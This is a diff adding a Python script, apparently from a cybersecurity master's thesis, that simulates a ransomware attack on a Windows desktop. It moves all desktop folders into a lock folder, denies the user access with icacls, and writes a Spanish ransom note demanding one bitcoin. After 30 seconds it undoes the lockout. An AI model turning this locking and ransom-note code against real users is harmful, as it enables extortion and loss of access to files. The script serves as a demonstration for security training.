@@ -1,0 +1,48 @@
+import os
+import subprocess
+import time
+from datetime import datetime
+from tkinter import messagebox, Tk
+
+
+tk_root = Tk()
+tk_root.withdraw()
+
+desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+lock_folder = os.path.join(desktop_path, '_bloqueadas_tfm')
+if not os.path.exists(lock_folder):
+    os.makedirs(lock_folder)
+
+folders_to_lock = [f for f in os.listdir(desktop_path) if os.path.isdir(os.path.join(desktop_path, f)) and f != '_bloqueadas_tfm']
+
+messagebox.showinfo("TFM Ciberseguridad", "Iniciando simulación de bloqueo de carpetas por 30 segundos.")
+
+now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+notice_file = os.path.join(desktop_path, 'aviso.txt')
+with open(notice_file, 'w', encoding='utf-8') as f:
+    f.write("Para que tus carpetas personales sean descifradas, envía 1 bitcoin a la siguiente dirección: XXXX. Dispones de 24 horas; de lo contrario, los archivos permanecerán cifrados de forma permanente y todo su contenido será utilizado con fines fraudulentos.\n")
+
+
+target_paths = []
+for folder in folders_to_lock:
+    src = os.path.join(desktop_path, folder)
+    dst = os.path.join(lock_folder, folder)
+    os.rename(src, dst)
+    target_paths.append(dst)
+
+for path in target_paths:
+    subprocess.call(['icacls', path, '/deny', f'{os.getlogin()}:F'])
+
+time.sleep(30)
+
+for path in target_paths:
+    subprocess.call(['icacls', path, '/remove:d', f'{os.getlogin()}'])
+
+for folder in folders_to_lock:
+    src = os.path.join(lock_folder, folder)
+    dst = os.path.join(desktop_path, folder)
+    os.rename(src, dst)
+
+messagebox.showinfo("TFM Ciberseguridad", "Simulación finalizada. Carpetas desbloqueadas y restauradas.")
+
+tk_root.destroy()
